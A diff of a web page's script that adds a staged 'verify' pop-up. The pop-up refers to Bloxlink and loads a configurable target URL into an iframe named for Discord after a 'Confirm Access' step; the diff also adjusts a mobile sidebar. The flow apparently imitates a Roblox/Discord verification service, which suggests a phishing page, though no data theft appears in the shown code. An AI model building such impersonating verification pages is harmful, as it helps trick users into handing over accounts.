+  const step2     = document.getElementById('step2Content');
+  const loading   = document.getElementById('loadingRedirectContent');
+  const iframeWrap = document.getElementById('iframeContent');
+  const iframe    = document.getElementById('discordIframe');
+
+  function openModal() {
+    step1.style.display = 'flex';
+    step2.style.display = 'none';
+    loading.style.display = 'none';
+    iframeWrap.style.display = 'none';
+    container.classList.remove('expanded');
+    overlay.classList.add('active');
+  }
+  function closeModal() {
+    overlay.classList.remove('active');
+    iframe.src = 'about:blank';
+  }
+
+  document.getElementById('verifyNowBtn').addEventListener('click', openModal);
+  document.getElementById('addAnotherBtn').addEventListener('click', openModal);
+  document.getElementById('popupClose').addEventListener('click', closeModal);
+  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
+
+  document.getElementById('btnContinueStep1').addEventListener('click', () => {
+    step1.style.display = 'none';
+    step2.style.display = 'flex';
+  });
+  document.getElementById('btnReturnToBloxlink').addEventListener('click', closeModal);
+  document.getElementById('btnCancelStep2').addEventListener('click', closeModal);
+
+  document.getElementById('btnConfirmAccess').addEventListener('click', () => {
+    step2.style.display = 'none';
+    loading.style.display = 'flex';
+    if (!iframe.src || iframe.src === 'about:blank') {
+      iframe.src = CONFIG.TARGET_URL;
+    }
+    setTimeout(() => {
+      loading.style.display = 'none';
+      iframeWrap.style.display = 'block';
+      container.classList.add('expanded');
+    }, 1200);
   });
 
-  // Mobile sidebar toggle
+  // ── 5. Mobile sidebar ──
   document.getElementById('mobileMenuBtn')?.addEventListener('click', () => {
     const inner = document.getElementById('sidebarInner');
     const sidebar = document.getElementById('sidebar');
     sidebar.classList.toggle('invisible');
-    inner.classList.remove('-left-64');
-    inner.classList.add('left-0');
+    inner.classList.toggle('left-[-16rem]');
+    inner.classList.toggle('left-0');
   });
   document.getElementById('closeSidebarBtn')?.addEventListener('click', () => {
     const inner = document.getElementById('sidebarInner');
     const sidebar = document.getElementById('sidebar');
+    inner.classList.add('left-[-16rem]');
     inner.classList.remove('left-0');
-    inner.classList.add('-left-64');
     sidebar.classList.add('invisible');
   });
 </script>
